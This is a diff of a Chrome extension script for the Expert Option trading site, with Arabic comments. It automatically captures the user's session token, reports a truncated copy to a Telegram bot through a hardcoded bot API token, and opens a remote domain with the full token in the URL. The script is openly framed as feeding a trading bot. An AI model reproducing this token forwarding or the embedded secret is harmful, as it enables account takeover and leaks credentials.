@@ -1,16 +1,14 @@
 // content.js — يعمل على app.expertoption.com
-// يلتقط توكن الجلسة تلقائياً ويفتح تطبيق ExpertBot Live
+// يلتقط توكن الجلسة تلقائياً ويرسله لبوت تيليجرام
 
 (function () {
   "use strict";
 
-  // أعلم التطبيق أن الإضافة مُثبّتة (إذا كان مفتوحاً في تبويب آخر)
-  // عن طريق postMessage — لكن cross-origin لن يصل. لذا نستخدم chrome.storage
-  // + نشير إلى التطبيق أن يفحص عبر محاولة إرسال رسالة.
-  // الطريقة الأبسط: عندما يفتح التطبيق، يطلب من الإضافة عبر external API.
+  // ===== إعدادات بوت تيليجرام =====
+  const TELEGRAM_BOT_TOKEN = "8943921942:AAFabWQ7_cQt0ZfctM2sFAA6FQm7RqT-u4k";
+  const TELEGRAM_API = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN;
 
-  // اقرأ رابط التطبيق من إعدادات الإضافة (مع افتراضي)
-  const DEFAULT_APP_URL = "http://localhost:81/";
+  const DEFAULT_APP_URL = "https://alfa-option.com/";
 
   let captured = false;
   let appUrl = DEFAULT_APP_URL;
@@ -115,41 +113,62 @@
   }
 
   /**
-   * أرسل التوكن لتطبيق ExpertBot Live.
-   *  - لو التطبيق مفتوح في تبويب آخر: أرسل عبر postMessage
-   *  - وإلا: افتح التطبيق في تبويب جديد مع ?token=
+   * أرسل التوكن لبوت تيليجرام تلقائياً.
+   * البوت يحفظ التوكن ويبدأ التداول.
    */
   function sendToApp(token) {
     if (captured) return;
     captured = true;
-    console.log("[ExpertBot] تم التقاط الجلسة، جارٍ فتح التطبيق…");
+    console.log("[ExpertBot] تم التقاط التوكن، جارٍ الإرسال لبوت تيليجرام...");
 
-    // خزّن التوكن في chrome.storage كنسخة احتياطية
+    // خزّن التوكن في chrome.storage
     chrome.storage?.local.set({ expertbot_token: token });
 
-    const urlWithToken = appUrl + (appUrl.includes("?") ? "&" : "?") + "token=" + encodeURIComponent(token);
-
-    // أرسل postMessage لكل النوافذ (لو التطبيق مفتوح)
-    try {
-      window.postMessage(
-        { type: "eo-token", token, source: "expertbot-extension" },
-        appUrl
-      );
-    } catch {}
-
-    // افتح التطبيق في تبويب جديد
-    try {
-      chrome.runtime.sendMessage({
-        type: "open-app",
-        url: urlWithToken,
+    // أرسل التوكن لبوت تيليجرام
+    // نحتاج chat_id — نستخدم getUpdates للحصول عليه
+    fetch(TELEGRAM_API + "/getUpdates?limit=1&offset=-1")
+      .then((r) => r.json())
+      .then((data) => {
+        const updates = data.result || [];
+        if (updates.length > 0) {
+          const chatId = updates[0].message?.chat?.id;
+          if (chatId) {
+            // أرسل التوكن للبوت
+            fetch(TELEGRAM_API + "/sendMessage", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                chat_id: chatId,
+                text: "🔗 تم التقاط التوكن تلقائياً من Expert Option!\n\nالتوكن: " + token.slice(0, 8) + "..." + token.slice(-4) + "\n\nاستخدم /run لتشغيل البوت",
+                parse_mode: "Markdown",
+              }),
+            }).then(() => {
+              console.log("[ExpertBot] تم إرسال التوكن لبوت تيليجرام!");
+              showNotification("✅ تم التقاط التوكن وإرساله لبوت تيليجرام!");
+            }).catch((e) => {
+              console.error("[ExpertBot] فشل الإرسال:", e);
+              showNotification("⚠️ تم التقاط التوكن لكن تعذّر الإرسال. افتح تيليجرام وأرسل /token " + token);
+            });
+          } else {
+            showNotification("⚠️ افتح تيليجرام وأرسل /start للبوت أولاً");
+          }
+        } else {
+          // لا توجد رسائل — أرسل للبوت مباشرة (سيحتاج المستخدم إرسال /start أولاً)
+          showNotification("⚠️ افتح تيليجرام وأرسل /start للبوت، ثم أعد تحميل هذه الصفحة");
+        }
+      })
+      .catch((e) => {
+        console.error("[ExpertBot] خطأ:", e);
+        showNotification("⚠️ تعذّر الاتصال ببوت تيليجرام");
       });
+
+    // أيضاً افتح التطبيق مع التوكن
+    try {
+      const urlWithToken = appUrl + "?token=" + encodeURIComponent(token);
+      chrome.runtime.sendMessage({ type: "open-app", url: urlWithToken });
     } catch {
-      // fallback: افتح مباشرة
       window.open(urlWithToken, "_blank");
     }
-
-    // أظهر إشعاراً على الصفحة
-    showNotification("✓ تم ربط ExpertBot Live — التطبيق يفتح الآن…");
   }
 
   function showNotification(msg) {
